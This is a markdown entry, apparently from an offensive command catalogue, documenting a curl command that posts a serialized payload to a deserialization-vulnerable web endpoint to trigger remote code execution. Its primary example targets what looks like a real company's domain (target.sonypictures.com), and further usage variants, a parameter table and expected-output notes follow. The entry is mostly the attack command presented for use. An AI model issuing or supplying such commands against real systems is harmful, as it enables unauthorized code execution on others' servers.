---
id: d4e5f6g7-h8i9-0123-defg-456789012345
data: >-
  curl -X POST -H "Content-Type: application/octet-stream" --data-binary
  @payload.ser https://target.sonypictures.com/vulnerable-endpoint
tags:
  - rce
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:36.923Z'
verified: false
validated: true
submitted: true
---
# curl-send-serialized-payload

## Command

```bash
curl -X POST -H "Content-Type: application/octet-stream" --data-binary @payload.ser https://target.sonypictures.com/vulnerable-endpoint
```

## Description

Sends a binary serialized payload to a web endpoint vulnerable to deserialization attacks, triggering RCE upon processing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -X POST | HTTP method for submission | Yes |
| -H "Content-Type: application/octet-stream" | Sets binary content type | Yes |
| --data-binary @payload.ser | Reads and sends binary file | Yes |
| https://target.sonypictures.com/vulnerable-endpoint | Target URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST --data-binary @payload.ser http://localhost/deserialize
```

### Advanced Usage

```bash
curl -X POST -H "Cookie: session=abc" --data-binary @payload.ser https://target.com/api/process
```

## Expected Output

HTTP response from server (e.g., 200 OK if successful, or error if rejected). No direct indication of RCE; check server for effects like file creation.

## Related

- [[Related Procedure|procedures/Exploit-Deserialization-for-RCE]]
